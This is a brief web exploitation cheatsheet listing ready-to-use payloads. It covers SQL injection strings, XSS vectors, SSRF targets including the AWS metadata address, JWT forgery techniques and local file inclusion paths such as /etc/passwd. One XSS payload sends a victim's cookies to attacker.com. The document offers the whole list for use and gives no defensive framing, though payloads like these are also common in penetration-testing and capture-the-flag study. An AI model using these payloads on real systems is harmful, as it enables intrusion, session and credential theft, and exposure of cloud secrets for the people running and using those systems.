# 🌐 Web Exploitation Cheatsheet

## SQL Injection
```sql
' OR 1=1--
' UNION SELECT NULL,NULL--
' AND SLEEP(5)--
' AND extractvalue(1,concat(0x7e,version()))--
```

## XSS
```javascript
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
```

## SSRF
```
http://127.0.0.1/admin
http://169.254.169.254/latest/meta-data/   # AWS
http://0x7f000001/                          # Hex bypass
http://[::1]/                               # IPv6
```

## JWT
```
1. alg:none → remove signature
2. RS256 → HS256 confusion (sign with public key)
3. jku injection → attacker JWK endpoint
```

## LFI
```
../../etc/passwd
php://filter/convert.base64-encode/resource=index.php
/proc/self/environ
```
